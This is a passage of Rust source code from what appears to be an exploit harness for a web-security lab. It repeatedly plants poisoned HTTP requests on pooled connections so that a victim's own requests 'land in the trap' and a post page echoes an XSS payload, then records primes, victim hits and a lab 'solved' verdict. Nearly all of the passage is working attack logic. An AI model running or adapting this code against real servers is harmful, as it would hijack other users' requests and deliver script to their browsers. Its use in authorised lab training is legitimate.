        out["probe_every"] = json!(probe_every);
        out["probe_delays"] = json!(probe_delays);
        out["plants"] = json!(plant_n);
        out["primes"] = json!(prime_n);
        out["probe_traces"] = json!(trace_n);
        out["c_primes"] = json!(*cprimes.lock().unwrap());
        out["cool_after_prime_ms"] = json!(cool_ms);
        out["post_page_hits"] = json!(post_hits.load(Ordering::SeqCst));
        out["hist"] = json!(*hist.lock().unwrap());
        out["samples"] = json!(*samples.lock().unwrap());
        out["banner"] = banner_v;
        out["final_banner"] = final_banner;
        out["solved"] = json!(solved_final);
        pi_rust_lib::report::success(
            "pool_window",
            out,
            "solved=true is the verdict; probe_traces>0 means the poison is inheritable at that delay",
        )
        .unwrap_or(());
        return;
    }

    // plant mode: keep arming the trap and let the victim's own requests land in it
    let mut rows: Vec<Value> = Vec::new();
    let mut primes: u64 = 0;
    let mut victim_signs: u64 = 0;
    let mut last_err = String::new();
    for round in 0..rounds {
        timeout::check();
        let tag = format!("{:0width$x}", counter, width = tag_len);
        counter += 1;
        let c_this = c_list.as_ref().map(|l| l[round as usize % l.len()]);
        match plant(&ctx, &tag, c_this) {
            Ok((plant_cls, claim, c_used)) => {
                let primed = plant_cls["post_page"].as_bool().unwrap_or(false)
                    || plant_cls["xss_hit"].as_bool().unwrap_or(false);
                if primed {
                    primes += 1;
                }
                graceful_close(claim);
                std::thread::sleep(Duration::from_millis(victim_wait_ms));
                // 受害者窗口过后,用新连接读帖子页:落痕 = 该页带着补完痕迹/载荷回显
                // 受害窗口过后读帖子页;--no-read 时跳过,免得自己那一发把陷阱吃掉
                let page: Result<Value, String> = if no_read {
                    Ok(json!({"skipped": true}))
                } else {
                    (|| -> Result<Value, String> {
                        let mut s = connect(&host, port)?;
                        let req = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", ctx.post_id, host);
                        s.write_all(req.as_bytes()).map_err(|e| e.to_string())?;
                        let _ = s.flush();
                        let b = drain(&mut s, probe_ms, 500);
                        let mut v = classify(&b, &ctx.ua);
                        if dump {
                            v["raw"] = json!(String::from_utf8_lossy(&b).chars().take(900).collect::<String>());
                        }
                        Ok(v)
                    })()
                };
                let sign = page.as_ref().map(|v| v["post_page"].as_bool().unwrap_or(false)).unwrap_or(false);
                if sign {
                    victim_signs += 1;
                }
                rows.push(json!({"round": round, "c_used": c_used, "plant": plant_cls, "primed": primed, "post_page": page}));
            }
            Err(e) => {
                last_err = e.clone();
                rows.push(json!({"round": round, "error": e}));
            }
        }
    }
    let banner = if argv.iter().any(|a| a == "--banner") { banner_solved(&host, port, &ctx) } else { Value::Null };
    out["rows"] = json!(rows);
    out["primes"] = json!(primes);
    out["victim_signs"] = json!(victim_signs);
    out["banner"] = banner;
    out["last_error"] = json!(last_err);
    pi_rust_lib::report::success(
        "pool_window",
        out,
        "primes>0 means the poison landed; banner.is_solved_class true is the lab verdict",
    )
    .unwrap_or(());
}
